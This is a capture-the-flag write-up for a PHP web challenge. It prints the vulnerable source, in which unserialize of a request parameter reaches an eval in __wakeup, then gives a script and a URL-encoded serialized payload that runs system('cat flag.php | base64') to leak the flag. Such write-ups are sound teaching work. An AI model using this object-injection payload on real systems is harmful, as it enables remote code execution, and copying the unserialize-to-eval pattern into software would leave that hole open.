# whats-your-name-part1 : Web

Flag Proof:`CTF{3346176ac1e79283318b4f69587c4b29b06d7e1fe385
3a4f37bb5442c80ba3fd}`

## Summary:

- Taking a look at the source code of the page, we see a comment `?source=`
- Using it as a `GET` param, we can see the source code of the page which is using some serialized php objects.

```php
<?php

error_reporting(0);
(isset($_GET['source']) AND show_source(__FILE__) AND die()); 

    class PHPObjectInjection{
        public $inject;
        function __construct(){
        }
        function __wakeup(){
            if(isset($this->inject)){
                eval($this->inject);
            }
        }
    }
    if(isset($_REQUEST['name'])){  
        $var1=unserialize($_REQUEST['name']);
        if(is_array($var1)){
            echo "<br/>".$var1[0]." - ".$var1[1];
        }
    }
    else{
        echo "What's your name? Part 1";
    }
?>

<!-- /?source -->
```

- it gets from a `GET` param `name`. Using this php code i  create my serialized object to exploit it and to give us the flag.

```php
<?php

 class PHPObjectInjection{
    public $inject;

}
$obj = new PHPObjectInjection();
$obj->inject =  "system('cat flag.php | base64');";

echo serialize($obj);
?>
```

- payload (i like using Base64 encoding as i know for sure the output will not be processed)  :
    - `O:18:%22PHPObjectInjection%22:1:{s:6:%22inject%22;s:32:%22system(%27cat%20flag.php%20|%20base64%27);%22;}`
- Passing it in browser/burp/curl will give us the base64 encoded string

![Untitled](whats-your-name-part1%20Web%20cae8a847902f4b39b94e320f535226e3/Untitled.png)

- Decoding it gives us the flag

![Untitled](whats-your-name-part1%20Web%20cae8a847902f4b39b94e320f535226e3/Untitled%201.png)